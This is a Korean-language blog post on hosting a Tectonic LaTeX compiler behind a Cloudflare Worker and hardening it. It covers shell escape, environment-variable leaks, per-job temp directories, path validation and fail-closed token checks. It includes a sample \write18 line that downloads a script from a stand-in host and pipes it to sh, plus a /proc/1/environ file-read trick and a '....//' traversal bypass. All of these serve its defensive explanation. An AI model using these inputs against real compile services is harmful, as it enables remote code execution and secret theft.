Shipping a LaTeX Compiler Behind an Edge App

📅 2026-10-21📰 Hacker News (Top)
frontenddevops

Cloudflare Workers 위에서 돌아가는 개인 프로젝트에 "채용공고에 맞춰 이력서를 LaTeX로 다시 써서 PDF로 뽑아주는" 기능을 추가하려다 마주친 문제를 다룬 글입니다. 결론만 보면 "엣지에서 못 하니 컨테이너를 하나 더 띄운다"는 뻔한 이야기처럼 보이지만, 그 과정에서 실패한 배포들, 그리고 겉보기엔 성공한 것 같았지만 실제로는 가장 위험했던 버전이 왜 위험했는지를 짚어보는 글입니다. 엣지 런타임에서 "라이브러리 하나만 추가하면 된다"는 식의 답이 왜 통하지 않는지, 그리고 신뢰할 수 없는 LaTeX 문서를 서버에서 컴파일할 때 어떤 것들을 막아야 하는지를 실제 코드와 함께 다룹니다.

Worker는 왜 스스로 PDF를 만들 수 없는가

Cloudflare Worker는 작은 서버가 아닙니다. V8 isolate, 즉 공유 프로세스 안에서 JavaScript와 WebAssembly만 실행하는 샌드박스입니다. 다른 프로그램을 띄울 방법이 없고, 애초에 뭔가를 설치할 OS 자체가 밑에 깔려 있지 않습니다. Workers가 node:fs로 쓰기 가능한 /tmp를 제공하기 시작했지만, 이건 디스크가 아니라 요청 하나에 종속된 인메모리 스크래치 공간일 뿐이라 툴체인이 살 수 있는 곳이 아닙니다.

LaTeX은 정반대의 존재입니다. pdflatex, xelatex, Tectonic은 전부 네이티브 바이너리로, 실제 운영체제를 기대하는 컴파일된 머신 코드입니다. 작업 중에 수십 개의 임시 파일을 읽고 쓰고, 고전적인 툴체인은 작업 도중 다른 프로그램을 셸 아웃으로 호출하기까지 합니다. 이 중 어느 것도 isolate 안에는 존재하지 않습니다.

TeX 엔진을 WebAssembly로 컴파일한 사례도 있습니다(SwiftLaTeX이 대표적입니다). 하지만 엔진에 실제 CV가 필요로 하는 폰트와 패키지까지 더하면 Worker의 크기·메모리 제한에 편하게 들어가지 않고, 이런 포팅들은 네이티브 엔진에 비해 기능이 뒤처집니다.

isolate는 JavaScript를 실행합니다. 컨테이너는 컴퓨터 한 대를 실행합니다. LaTeX에는 컴퓨터가 필요합니다.

결국 컴파일은 다른 곳에서 일어나야 하고, Worker는 그걸 HTTP로 호출해야 합니다. 이게 아키텍처의 전부입니다. 일단 이 그림이 보이고 나면 나머지는 디테일일 뿐입니다.

왜 일반 TeX 설치가 아니라 Tectonic인가

노트북에서 LaTeX을 써본 적이 있다면 TeX Live를 설치했을 겁니다. 수 기가바이트짜리 패키지, 폰트, 프로그램 묶음인데 대부분은 어떤 문서도 건드리지 않습니다. 그리고 pdflatex를 두세 번 연달아 돌려야 했을 겁니다. 상호 참조나 참고문헌은 이후 패스에서야 정착되기 때문이고, 끝나면 .aux, .log, .toc 파일로 가득 찬 폴더를 치워야 했을 겁니다.

Tectonic은 같은 엔진을 다른 방식으로 접근합니다. XeTeX과 TeX Live를 기반으로 만든 완전한 TeX/LaTeX 엔진을 하나의 프로그램으로 패키징한 것입니다. 서버 입장에서 중요한 특징이 세 가지 있습니다.

첫째, 지원 파일을 필요할 때 가져옵니다. 5GB짜리 설치 대신, 버전이 매겨진 번들에서 해당 문서가 실제로 쓰는 패키지·폰트·하이픈 처리 패턴만 가져와 캐싱합니다. 컨테이너 이미지는 작게 유지되면서도 특이한 패키지가 필요한 문서도 여전히 컴파일됩니다.

둘째, 문서가 필요로 하는 만큼 패스를 반복합니다. 프로젝트의 표현을 빌리면 "필요한 만큼, 그리고 딱 필요한 만큼만 TeX과 BibTeX을 자동으로 루프"합니다. 서비스는 호출 한 번으로 완성된 PDF를 받으면 되고, 몇 번 재실행해야 할지 추측할 필요가 없습니다.

셋째, 기본적으로 TeX의 중간 파일들을 남기지 않아서, 작업 디렉터리를 입력 파일과 출력 파일로만 깔끔하게 유지할 수 있습니다.

그리고 나머지 이유들이 없어도 Tectonic을 고를 네 번째 이유가 있습니다. 바로 shell escape가 꺼져 있다는 점입니다.

여기서 흔히 나올 질문은 "더 빠르고 훨씬 단순한 Typst는 왜 안 쓰냐"는 겁니다. 답은 간단한데, 이 글쓴이의 이력서와 거기서 쓰는 패키지들이 이미 LaTeX으로 작성되어 있고, 목표는 가지고 있는 것을 다시 쓰는 게 아니라 컴파일하는 것이었기 때문입니다.

Shell escape는 무엇이고 왜 중요한가

TeX에는 \write18이라는 프리미티브가 있습니다. 보통 \write는 텍스트를 파일로 보냅니다. 그런데 스트림 18번은 특수해서, shell escape가 켜져 있으면 거기에 쓴 내용이 컴파일을 수행하는 머신에서 셸 명령으로 실행됩니다.

이건 나름의 이유가 있어서 존재합니다. minted 패키지는 코드 하이라이팅을 위해 Python을 호출하고, 일부 그래픽 패키지는 외부 변환기를 호출합니다. 자기 노트북에서 자기 문서를 컴파일하는 상황이라면 아무 문제가 없습니다.

하지만 이 서비스가 다른 사람이 작성한 문서, 혹은 언어 모델이 작성한 문서를 컴파일한다고 생각해보면 얘기가 달라집니다.

\immediate\write18{curl -s https://evil.example/x.sh | sh}

shell escape가 켜져 있으면 이 문서는 스크립트를 다운로드해서 서버에서 실행합니다. 문서 자체가 원격 셸이 되는 셈입니다.

TeX Live는 중간 지점으로 restricted shell escape를 제공하는데, 알려진 명령어 목록만 허용하는 방식입니다. Tectonic은 한 발 더 나아가 명시적으로 켜지 않는 한 shell escape가 아예 꺼져 있고, 서비스는 추가로 --untrusted 옵션까지 넘깁니다. 문서에 따르면 이 옵션을 붙이면 "-Z shell-escape 같은 다른 설정과 무관하게 이 기능들은 켜질 수 없습니다." 대가는 minted처럼 shell escape가 필요한 패키지들이 동작하지 않는다는 점인데, CV를 위해서는 전혀 손해가 아닙니다.

다만 이것이 TeX을 샌드박스로 만들어주지는 않습니다. Shell escape는 문서가 프로그램을 실행하는 것은 막지만, 파일을 읽는 것은 막지 못합니다. \input{/some/path}는 지극히 평범한 TeX 문법이고 --untrusted도 이걸 바꾸지 않습니다. 실제로 확인해보니, /proc/1/environ, 즉 서버 프로세스 자신의 환경 변수를 여는 문서는 그 내용을 읽어서 컴파일 로그에 그대로 출력했습니다.

이게 첫 번째 버전에서 발견한 구멍이었습니다. 컴파일러가 서버의 환경 변수를 그대로 물려받았고, 서버의 환경 변수에는 서비스를 보호하는 토큰이 들어 있었으니, 문서 하나가 서비스 자신의 비밀번호를 호출자에게 그대로 출력해버릴 수 있었던 겁니다. 지금은 컴파일러가 완전히 새로 구성된 환경에서 동작하고, 모든 작업은 권한 없는 사용자로 실행되며, 토큰은 stdin을 통해 서버에 전달되어 어떤 프로세스의 환경 변수에도 들어가지 않습니다.

컴파일러가 읽을 수 있는 것은 문서도 읽을 수 있습니다. 그러니 읽혀서는 안 되는 것은 애초에 그 컨테이너 안에 두지 않아야 합니다.

서비스는 실제로 무엇을 하는가

컨테이너 안에서 Node 위에 Hono로 돌아가는 약 100줄짜리 서비스이고, 엔드포인트는 두 개입니다.

GET /health는 {"ok": true}를 반환합니다. 대부분의 호스팅 플랫폼은 컨테이너가 살아 있는지 확인하기 위해 폴링할 URL을 원합니다.

POST /compile은 JSON 바디를 받아 새 임시 디렉터리에 문서를 쓰고, Tectonic을 실행한 뒤 PDF 바이트를 반환하거나, 실패하면 422와 함께 컴파일러 로그를 반환합니다. 이 로그가 중요한데, 컴파일이 실패했을 때 그 에러 텍스트가 바로 사람이(혹은 나중엔 에이전트가) 무엇을 고쳐야 할지 알아내는 단서이기 때문입니다.

여기서 훔쳐 쓸 만한 디테일이 두 가지 있습니다.

첫째, 모든 작업은 각자 자신만의 임시 디렉터리를 받습니다. mkdtemp로 생성하고 finally 블록에서 삭제합니다.

const dir = await mkdtemp(join(tmpdir(), 'job-'));
try {
  // write main.tex and its sibling files, run tectonic, read the PDF
} finally {
  await rm(dir, { recursive: true, force: true });
}

mkdtemp는 POSIX의 C 함수를 Node가 fs.mkdtemp로 노출한 것이고, 셸에서는 mktemp -d와 같습니다. prefix를 주면 임의의 6자리 문자를 덧붙여서, 디렉터리를 권한 0700으로 원자적으로 한 번에 생성합니다. 즉 소유자만 읽을 수 있습니다. 이미 같은 이름이 존재하면 재사용하지 않습니다. 이 원자성이 핵심입니다. Date.now()로 직접 이름을 만들면 같은 밀리초에 요청 두 개가 들어오는 순간 충돌하고, 생성 전에 "이 이름이 존재하는가?"를 확인하는 방식은 확인과 생성 사이에 다른 무언가가 먼저 만들어버릴 수 있는 틈을 남깁니다.

다만 임시 디렉터리가 보안 경계는 아닙니다. 모든 작업은 같은 사용자로 실행되므로 0700은 다른 사용자를 막아줄 뿐, 다른 작업(job)을 막아주진 않습니다. 충돌과 정리(cleanup) 문제만 해결해줄 뿐입니다.

왜 이게 노트북보다 서버리스 컨테이너에서 더 중요할까요? Cloud Run의 컨테이너 계약에서 두 가지 사실이 있습니다.

하나, 인스턴스 하나가 여러 요청을 동시에 처리합니다. Cloud Run의 기본 동시성은 80이라서, 두 사람이 동시에 컴파일을 요청하면 같은 컨테이너 안에서, 같은 /tmp를 공유하며 실행될 가능성이 매우 높습니다. 두 작업이 모두 /tmp/main.tex에 쓴다면, 두 번째 쓰기가 첫 번째 것을 덮어써서 첫 번째 사람이 두 번째 사람의 이력서로 만든 PDF를 받게 됩니다.

둘, 파일 시스템이 디스크가 아닙니다. Cloud Run의 쓰기 가능한 파일 시스템은 메모리에 있어서, 쓰는 모든 파일이 인스턴스의 RAM을 잡아먹고, 인스턴스가 종료될 때까지는 아무도 정리해주지 않습니다. 그리고 그 종료는 마지막 요청 이후 15분 뒤에나 일어날 수 있습니다. 지우는 걸 잊은 파일들은 서서히 진행되는 메모리 누수입니다.

둘째, 형제 파일 경로는 정리가 아니라 검증됩니다. CV는 거의 항상 단일 파일이 아닙니다. 이 글쓴이의 경우 사진 하나와 때로는 .sty 패키지 파일이 필요합니다. 이런 파일들은 요청 안에서 상대 경로를 키로 하는 files 맵으로 전달됩니다. 어떤 파일이든 쓰기 전에 서비스는 경로를 작업 디렉터리 기준으로 해석해보고, 결과가 여전히 그 디렉터리 안에 있지 않으면 요청을 거부합니다. "정리"가 아니라 "거부"를 택한 건 의도적입니다. 첫 번째 버전은 이름에서 ../를 걸러내려 했는데, ....//는 한 번의 필터링을 거치면 ../로 살아남습니다. 이게 바로 path traversal, 가장 오래된 버그 중 하나입니다. 절대 경로, 백슬래시, 그리고 main.tex처럼 컴파일 자체가 쓰는 이름들도 거부됩니다.

files 맵은 일반 문자열(utf8 텍스트를 의미)이나, encoding과 content를 가진 객체 중 하나를 받아서, PNG 같은 파일은 base64로 인코딩되어 전달될 수 있습니다. 이 형태는 임의로 정한 게 아니라, 데이터베이스에 이미 있는 DocumentAsset 타입을 그대로 반영한 것이라, 문서에 저장된 에셋이 별도 변환 없이 컴파일러로 그대로 전달됩니다.

토큰이 없으면 서비스는 왜 아예 시작조차 하지 않는가

이 컨테이너는 공개된 URL 위에 떠 있습니다. 인증 없는 엔드포인트가 실제 TeX 엔진을 돌려준다는 건, 발견한 누구에게나 무료 컴퓨팅 서비스를 내어주는 동시에 DoS 공격의 표적이 되는 것이기도 합니다.

그래서 /compile은 bearer 토큰을 요구하고, 비교는 상수 시간(constant time)으로 이루어져서 응답 시간이 추측값 중 몇 글자가 맞았는지를 노출하지 않습니다(길이를 먼저 비교하는데, 이건 토큰이 얼마나 긴지만 드러낼 뿐 내용은 드러내지 않습니다). 그리고 COMPILE_TOKEN이 설정되어 있지 않으면 프로세스는 시작 시점에 바로 종료됩니다.

const TOKEN = process.env.COMPILE_TOKEN;
if (!TOKEN) {
  console.error('COMPILE_TOKEN is not set, refusing to start.');
  process.exit(1);
}

이것이 바로 "fail closed"라고 불리는 설계입니다. 시스템이 보안 검사를 수행할 수 없는 상황, 즉 의존하는 무언가가 죽었거나 설정값이 빠졌을 때 선택지는 두 가지입니다. fail open은 검사를 건너뛰고 계속 동작하는 것이고, fail closed는 멈춘 채로 누군가 고칠 때까지 안전한 상태를 유지하는 것입니다. AuthZed의 글은 이걸 한 줄씩으로 정리합니다. fail open 하는 시스템은 "기본값이 동작 상태 혹은 열린 상태"이고, fail closed 하는 시스템은 "기본값이 닫힌 상태 혹은 안전한 상태"입니다.

방화벽에서 fail open은 모든 트래픽을 통과시키는 걸 의미합니다. 이 서비스에서 fail open이었다면 "토큰 없음, 인증 없이 시작합니다" 같은 로그 한 줄과 함께 누구나 쓸 수 있는 컴파일러가 남았을 겁니다. 이 두 실패는 겪는 입장에서 느낌이 매우 다릅니다. 호스팅 대시보드의 크래시 루프는 귀찮고 눈에 바로 띄지만, 열린 엔드포인트는 조용하고, 그리고 결국 청구서를 보고 나서야 알게 됩니다.

더 강력한 대안은 무엇이었을까

Cloud Run은 인증을 대신 해줄 수도 있습니다. 서비스를 공개 접근 없이 배포하면, 모든 요청은 Google이 서명한 identity token, 즉 수명이 짧은 JWT를 가지고 와야 합니다. 이 토큰은 서비스의 URL을 audience로 명시하고, roles/run.invoker 역할을 부여받은 호출자를 식별합니다. Google의 프론트엔드가 이 토큰을 컨테이너에 요청이 도달하기 전에 검증합니다.

이 방식은 두 가지 면에서 공유 비밀(shared secret)보다 낫습니다. 토큰이 한 시간 이내에 만료되기 때문에 유출될 수 있는 장기 비밀이 존재하지 않고, 낯선 요청은 Google의 엣지에서 거부되므로 인스턴스를 깨우지도, 비용을 발생시키지도 않습니다. 반면 공유 비밀 방식에서는 낯선 요청도 일단 컨테이너까지 도달하고, 인스턴스가 스핀업되고, 헤더를 읽고 나서야 401을 응답합니다. 앱은 안전하지만, 일은 이미 한 셈입니다.
